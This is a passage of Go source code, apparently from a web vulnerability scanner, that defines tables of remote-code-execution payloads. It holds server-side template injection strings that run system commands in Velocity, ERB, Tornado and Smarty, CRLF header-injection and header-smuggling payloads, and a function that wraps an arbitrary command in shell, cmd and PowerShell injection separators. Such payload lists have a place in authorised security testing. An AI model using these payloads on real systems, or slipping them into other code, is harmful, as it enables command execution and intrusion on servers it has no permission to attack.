		{Payload: "#set($e=\"e\")#set($x=$e.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('echo H4CK1T'))", Technique: "ssti", OS: "velocity", EchoStr: "H4CK1T", Category: "vel-rce", Severity: "critical"},

		// Jade/Pug
		{Payload: "#{7*7}", Technique: "ssti", OS: "jade", EchoStr: "49", Category: "jade-math", Severity: "high"},

		// ERB (Ruby)
		{Payload: "<%= 7*7 %>", Technique: "ssti", OS: "erb", EchoStr: "49", Category: "erb-math", Severity: "high"},
		{Payload: "<%= system('echo H4CK1T') %>", Technique: "ssti", OS: "erb", EchoStr: "H4CK1T", Category: "erb-rce", Severity: "critical"},

		// Tornado (Python)
		{Payload: "{{7*7}}", Technique: "ssti", OS: "tornado", EchoStr: "49", Category: "tornado-math", Severity: "high"},
		{Payload: "{% import os %}{{os.system('echo H4CK1T')}}", Technique: "ssti", OS: "tornado", EchoStr: "H4CK1T", Category: "tornado-rce", Severity: "critical"},

		// Smarty (PHP)
		{Payload: "{system('echo H4CK1T')}", Technique: "ssti", OS: "smarty", EchoStr: "H4CK1T", Category: "smarty-rce", Severity: "critical"},

		// Java (JSP EL)
		{Payload: "${7*7}", Technique: "ssti", OS: "jsp-el", EchoStr: "49", Category: "jsp-el-math", Severity: "high"},
	}
}

// ===========================================================================
// 10. HEADER/COOKIE INJECTION — 10+ payloads
// ===========================================================================

func getHeaderInjectionPayloads() []RCEPayload {
	marker := ECHO_MARKER
	echo := ECHO_CMD
	return []RCEPayload{
		{Payload: fmt.Sprintf("\\n%s\\n", echo), Technique: "output-hdrinj", OS: "unix", EchoStr: marker, Category: "header-crlf", Severity: "high"},
		{Payload: fmt.Sprintf("\\r\\n%s\\r\\n", echo), Technique: "output-hdrinj", OS: "unix", EchoStr: marker, Category: "header-crlf2", Severity: "high"},
		{Payload: fmt.Sprintf("'\\n%s\\n'", echo), Technique: "output-hdrinj", OS: "unix", EchoStr: marker, Category: "sq-hdr", Severity: "high"},
		{Payload: fmt.Sprintf("\"\\n%s\\n\"", echo), Technique: "output-hdrinj", OS: "unix", EchoStr: marker, Category: "dq-hdr", Severity: "high"},
		{Payload: "%0aX-Custom:%20H4CK1T", Technique: "output-hdrinj", OS: "unix", EchoStr: "H4CK1T", Category: "hdr-smuggle", Severity: "high"},
		{Payload: "X-Forwarded-For: 127.0.0.1%0aX-Cmd:%20echo%20H4CK1T", Technique: "output-hdrinj", OS: "unix", EchoStr: "H4CK1T", Category: "xff-smuggle", Severity: "high"},
	}
}

// ===========================================================================
// MASTER PAYLOAD COLLECTOR
// ===========================================================================

func getAllPayloads(technique string) []RCEPayload {
	var all []RCEPayload
	switch technique {
	case "time":
		all = getTimePayloads()
	case "output":
		all = getOutputPayloads()
	case "error":
		all = getErrorPayloads()
	case "blind":
		all = getBlindPayloads()
	case "oob":
		all = getOOBPayloads()
	case "waf":
		all = getWAFBypassPayloads()
	case "shell":
		all = getShellVariantPayloads()
	case "php":
		all = getPHPPayloads()
	case "ssti":
		all = getSSTIPayloads()
	case "hdr":
		all = getHeaderInjectionPayloads()
	default:
		all = append(all, getTimePayloads()...)
		all = append(all, getOutputPayloads()...)
		all = append(all, getErrorPayloads()...)
		all = append(all, getBlindPayloads()...)
		all = append(all, getWAFBypassPayloads()...)
		all = append(all, getShellVariantPayloads()...)
		all = append(all, getPHPPayloads()...)
		all = append(all, getSSTIPayloads()...)
		all = append(all, getHeaderInjectionPayloads()...)
	}
	return all
}

func getExploitPayloads(cmd string) []string {
	return []string{
		fmt.Sprintf(";%s;", cmd), fmt.Sprintf("|%s|", cmd), fmt.Sprintf("`%s`", cmd),
		fmt.Sprintf("$(%s)", cmd), fmt.Sprintf("&%s&", cmd),
		fmt.Sprintf("';%s;'", cmd), fmt.Sprintf("\";%s;\"", cmd),
		fmt.Sprintf("${%s}", cmd), fmt.Sprintf("%%0a%s%%0a", cmd),
		fmt.Sprintf("&&%s&&", cmd), fmt.Sprintf("||%s||", cmd),
		fmt.Sprintf("&%s #", cmd), fmt.Sprintf("|%s #", cmd), fmt.Sprintf(";%s #", cmd),
		fmt.Sprintf(";%s %%23", cmd), fmt.Sprintf(";%s <!--", cmd),
		fmt.Sprintf("& cmd /c %s &", cmd), fmt.Sprintf("; powershell -c \"%s\" ;", cmd),
		fmt.Sprintf("| cmd /c %s |", cmd), fmt.Sprintf("| powershell -c \"%s\" |", cmd),
	}
}
